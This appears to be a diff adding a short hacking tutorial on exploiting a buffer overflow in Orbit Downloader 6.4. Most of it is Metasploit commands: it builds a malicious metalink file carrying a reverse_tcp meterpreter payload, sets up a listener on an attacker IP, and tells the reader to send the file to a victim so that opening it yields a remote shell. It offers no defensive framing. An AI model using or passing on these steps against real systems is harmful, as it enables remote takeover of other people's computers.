@@ -1,0 +1,27 @@
+
+Hack Remote PC using Orbit Downloader URL Unicode Conversion Overflow
+
+This module exploits a stack-based buffer overflow in Orbit Downloader. The vulnerability is due to Orbit converting an URL ascii string to unicode in a insecure way with Multi ByteTo Wide Char. The vulnerability is exploited with a specially crafted metalink file that should be opened with Orbit through the “File->Add Metalink…” option.
+Orbit Downloader 6.4 on Windows XP SP2
+Orbit Downloader 6.4 on Windows 7
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type 
+msf > use exploit/windows/fileformat/orbit_download_failed_bof
+msf exploit (orbit_download_failed_bof)>set payload windows/meterpreter/reverse_tcp
+msf exploit (orbit_download_failed_bof)>set lhost 192.168.1.4 (IP of Local Host)
+msf exploit (orbit_download_failed_bof)>exploit 
+
+After we successfully generate the malicious metalink File, it will stored on your local computer
+/root/.msf4/local/msf.metalink
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.4
+exploit 
+Now send your msf.metalink files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
+
+
